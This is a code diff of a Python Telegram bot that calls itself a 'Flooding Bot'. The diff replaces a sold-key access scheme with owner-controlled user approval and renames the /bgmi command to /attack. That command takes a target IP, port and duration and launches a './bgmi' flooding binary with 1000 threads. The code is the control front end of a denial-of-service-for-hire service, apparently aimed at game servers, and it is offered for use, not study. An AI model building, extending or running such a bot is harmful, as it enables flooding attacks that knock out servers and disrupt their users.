@@ -1,29 +1,18 @@
 import subprocess
 import json
-import os
-import random
-import string
 import datetime
 import asyncio
-from telegram import Update
+from telegram import Update, User
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
 
 USER_FILE = "users.json"
-KEY_FILE = "keys.json"
-
 DEFAULT_THREADS = 1000
 DEFAULT_PACKET = 9
 
 users = {}
-keys = {}
 user_processes = {}  # Dictionary to track processes for each user
-
-
-def load_data():
-    global users, keys
-    users = load_users()
-    keys = load_keys()
+OWNER_ID = None  # Will hold the owner ID for managing approvals/disapprovals
 
 
 def load_users():
@@ -42,92 +31,94 @@ def save_users():
         json.dump(users, file)
 
 
-def load_keys():
-    try:
-        with open(KEY_FILE, "r") as file:
-            return json.load(file)
-    except FileNotFoundError:
-        return {}
-    except Exception as e:
-        print(f"Error loading keys: {e}")
-        return {}
-
-
-def save_keys():
-    with open(KEY_FILE, "w") as file:
-        json.dump(keys, file)
-
-
-def generate_key(length=6):
-    characters = string.ascii_letters + string.digits
-    return ''.join(random.choice(characters) for _ in range(length))
-
-
-def add_time_to_current_date(hours=0, days=0):
-    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
-
-
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def set_owner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global OWNER_ID
     user_id = str(update.message.from_user.id)
+
+    # Only allow users in ADMIN_IDS to set the owner
     if user_id in ADMIN_IDS:
-        command = context.args
-        if len(command) == 2:
-            try:
-                time_amount = int(command[0])
-                time_unit = command[1].lower()
-                if time_unit == 'hours':
-                    expiration_date = add_time_to_current_date(hours=time_amount)
-                elif time_unit == 'days':
-                    expiration_date = add_time_to_current_date(days=time_amount)
-                else:
-                    raise ValueError("Invalid time unit")
-                key = generate_key()
-                keys[key] = expiration_date
-                save_keys()
-                response = f"Key generated: {key}\nExpires on: {expiration_date}"
-            except ValueError:
-                response = "Please specify a valid number and unit of time (hours/days)."
-        else:
-            response = "Usage: /genkey <amount> <hours/days>"
+        if OWNER_ID is not None:
+            await update.message.reply_text("The owner has already been set. Only one owner is allowed.")
+            return
+        
+        if len(context.args) != 1:
+            await update.message.reply_text("Usage: /setowner <user_id>")
+            return
+
+        OWNER_ID = context.args[0]
+        await update.message.reply_text(f"Owner has been set to {OWNER_ID}. Now only this user can approve/disapprove users.")
     else:
-        response = "ONLY OWNER CAN USE 💀 OWNER @..."
-    await update.message.reply_text(response)
+        await update.message.reply_text("Only bot owners can set the owner.")
 
 
-async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
-    command = context.args
-    if len(command) == 1:
-        key = command[0]
-        if key in keys:
-            expiration_date = keys[key]
-            if user_id in users:
-                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
-                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
-                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
-            else:
-                users[user_id] = expiration_date
-            save_users()
-            del keys[key]
-            save_keys()
-            response = f"✅ Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @"
-        else:
-            response = "Invalid or expired key. Buy from @."
+
+    if OWNER_ID is None:
+        await update.message.reply_text("The bot owner is not set yet. Please set the owner first using /setowner <user_id>.")
+        return
+
+    # Check if the user is the owner
+    if user_id != OWNER_ID:
+        await update.message.reply_text("Only the bot owner can approve users.")
+        return
+
+    # Check if the command is used in reply to another user's message
+    if update.message.reply_to_message:
+        target_user: User = update.message.reply_to_message.from_user
+        target_user_id = str(target_user.id)
+    elif len(context.args) == 1:  # Check if a user ID is provided as an argument
+        target_user_id = context.args[0]
     else:
-        response = "Usage: /redeem <key>"
-    await update.message.reply_text(response)
+        await update.message.reply_text("Usage: Reply to a user's message or provide their user ID: /approve <user_id>")
+        return
+
+    users[target_user_id] = str(datetime.datetime.now() + datetime.timedelta(days=30))  # Set 30 days expiration
+    save_users()
+    await update.message.reply_text(f"User {target_user_id} has been approved. Total approved users: {len(users)}")
 
 
-async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+
+    if OWNER_ID is None:
+        await update.message.reply_text("The bot owner is not set yet. Please set the owner first using /setowner <user_id>.")
+        return
+
+    # Check if the user is the owner
+    if user_id != OWNER_ID:
+        await update.message.reply_text("Only the bot owner can disapprove users.")
+        return
+
+    # Check if the command is used in reply to another user's message
+    if update.message.reply_to_message:
+        target_user: User = update.message.reply_to_message.from_user
+        target_user_id = str(target_user.id)
+    elif len(context.args) == 1:  # Check if a user ID is provided as an argument
+        target_user_id = context.args[0]
+    else:
+        await update.message.reply_text("Usage: Reply to a user's message or provide their user ID: /disapprove <user_id>")
+        return
+
+    if target_user_id in users:
+        del users[target_user_id]
+        save_users()
+        await update.message.reply_text(f"User {target_user_id} has been disapproved. Total approved users: {len(users)}")
+    else:
+        await update.message.reply_text("User not found in the approved list.")
+
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global user_processes
     user_id = str(update.message.from_user.id)
 
-    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @")
+    # Check if the user is approved
+    if user_id not in users:
+        await update.message.reply_text("You are not authorized to use this command.")
         return
 
     if len(context.args) != 4:
-        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration> <sid>')
+        await update.message.reply_text('Usage: /attack <target_ip> <port> <duration> <sid>')
         return
 
     target_ip = context.args[0]
@@ -136,7 +127,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     packet = context.args[3]
 
     if user_id in user_processes and user_processes[user_id].poll() is None:
-        await update.message.reply_text("⚠️ An attack is already running. Please wait for it to finish.")
+        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
         return
 
     flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
@@ -161,35 +152,16 @@ async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
     if user_id in ADMIN_IDS:
         if users:
-            response = "Authorized Users:\n"
+            response = f"Authorized Users ({len(users)} total):\n"
             for user_id, expiration_date in users.items():
                 try:
                     user_info = await context.bot.get_chat(int(user_id))
                     username = user_info.username if user_info.username else f"UserID: {user_id}"
-                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                    response += f"- @{username} (ID: {user_id})\n"
                 except Exception:
-                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+                    response += f"- User ID: {user_id}\n"
         else:
-            response = "No data found."
-    else:
-        response = "ONLY OWNER CAN USE."
-    await update.message.reply_text(response)
-
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.message.from_user.id)
-    if user_id in ADMIN_IDS:
-        message = ' '.join(context.args)
-        if not message:
-            await update.message.reply_text('Usage: /broadcast <message>')
-            return
-
-        for user in users.keys():
-            try:
-                await context.bot.send_message(chat_id=int(user), text=message)
-            except Exception as e:
-                print(f"Error sending message to {user}: {e}")
-        response = "Message sent to all users."
+            response = "No authorized users found."
     else:
         response = "ONLY OWNER CAN USE."
     await update.message.reply_text(response)
@@ -197,14 +169,14 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     response = (
-        "Welcome to the Flooding Bot by @{OWNER_USERNAME}..! Here are the available commands:\n\n"
+        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
         "Admin Commands:\n"
-        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
-        "/allusers - Show all authorized users.\n"
-        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
+        "/setowner <user_id> - Set the bot owner (only for admin users, one owner only).\n"
+        "/approve - Approve a user (reply to a user or provide their ID).\n"
+        "/disapprove - Disapprove a user (reply to a user or provide their user ID).\n"
+        "/allusers - Show all authorized users.\n\n"
         "User Commands:\n"
-        "/redeem <key> - Redeem a key to gain access.\n"
-        "/bgmi <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
+        "/attack <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
     )
     await update.message.reply_text(response)
 
@@ -212,14 +184,15 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 def main() -> None:
     application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    application.add_handler(CommandHandler("genkey", genkey))
-    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("setowner", set_owner))
+    application.add_handler(CommandHandler("approve", approve_user))
+    application.add_handler(CommandHandler("disapprove", disapprove_user))
+    application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("allusers", allusers))
-    application.add_handler(CommandHandler("bgmi", bgmi))
-    application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(CommandHandler("help", help_command))
 
-    load_data()
+    global users
+    users = load_users()
     application.run_polling()
 
 
